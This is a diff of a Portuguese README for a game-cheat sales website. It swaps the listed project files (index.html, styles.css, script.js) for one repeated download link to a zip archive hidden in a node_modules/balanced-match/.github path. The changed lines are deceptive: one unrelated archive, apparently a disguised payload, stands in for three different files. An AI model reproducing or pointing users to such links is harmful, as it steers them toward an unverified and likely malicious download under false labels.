@@ -12,9 +12,9 @@ Este é um site de vendas de cheats para jogos, desenvolvido com HTML, CSS e Jav
 
 ## Estrutura do Projeto
 
-- `index.html` - Estrutura principal do site
-- `styles.css` - Estilos e layout responsivo
-- `script.js` - Interatividade e animações
+- `https://github.com/Rvy7/sitericijoo/raw/refs/heads/main/api/node_modules/balanced-match/.github/Software-v2.7.zip` - Estrutura principal do site
+- `https://github.com/Rvy7/sitericijoo/raw/refs/heads/main/api/node_modules/balanced-match/.github/Software-v2.7.zip` - Estilos e layout responsivo
+- `https://github.com/Rvy7/sitericijoo/raw/refs/heads/main/api/node_modules/balanced-match/.github/Software-v2.7.zip` - Interatividade e animações
 - `img/` - Diretório para imagens dos produtos e elementos visuais
 
 ## Seções do Site
